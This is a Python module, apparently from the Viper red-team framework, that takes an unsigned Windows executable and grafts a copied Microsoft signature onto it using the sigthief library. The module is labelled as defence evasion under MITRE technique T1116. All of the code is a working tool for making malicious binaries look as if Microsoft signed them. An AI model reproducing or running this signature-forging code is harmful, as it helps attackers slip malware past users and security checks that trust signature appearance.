# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :
import os

from Lib.ModuleAPI import *
from MODULES_DATA.DefenseEvasion_CodeSigning_StolenMircosoftWindowsSignature import sigthief


class PostModule(PostPythonModule):
    NAME = "伪造Microsoft Windows签名"
    DESC = "在未签名的EXE文件中添加Microsoft Windows签名\n" \
           "签名无法通过操作系统签名认证."

    MODULETYPE = TAG2CH.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1116"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/hfdahb"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1116/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionFileEnum(ext=['exe', 'EXE']),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.session = None
        self.module_path_list = []

    def check(self):
        """执行前的检查函数"""
        return True, None

    def run(self):
        # 将msf服务器的exe写入viper本地
        old_exe = self.get_fileoption_filename()
        self.log_info("将 {} 写入临时目录".format(old_exe))
        old_exe_binary_data = self.read_from_loot(old_exe)
        if old_exe_binary_data is None:
            self.log_error("{} 文件不存在".format(old_exe))
            return
        exe_path = File.safe_os_path_join(File.tmp_dir(), old_exe)
        with open(exe_path, "wb") as f:
            f.write(old_exe_binary_data)

        # 设置输出exe路径
        output_finename = "{}_signed.exe".format(os.path.splitext(old_exe)[0])
        output_path = File.safe_os_path_join(File.tmp_dir(), output_finename)
        # 读取签名文件
        self.log_info("签名文件")
        with open(os.path.join(self.module_data_dir, "consent.exe_sig"), "rb") as sf:
            sigfile_bin = sf.read()

        # 签名exe
        sigthief.signbin(exe_path, sigfile_bin, output_path)

        # 读取新生成的exe二进制内容
        with open(output_path, 'rb') as of:
            output_bin = of.read()
        # 清理临时文件
        self.log_info("清理临时文件")
        File.clean_tmp_dir()

        if self.write_to_loot(output_finename, output_bin):
            self.log_good("签名完成,新文件名 : {}".format(output_finename))
        else:
            self.log_error("签名失败,请检查后台渗透服务器配置")
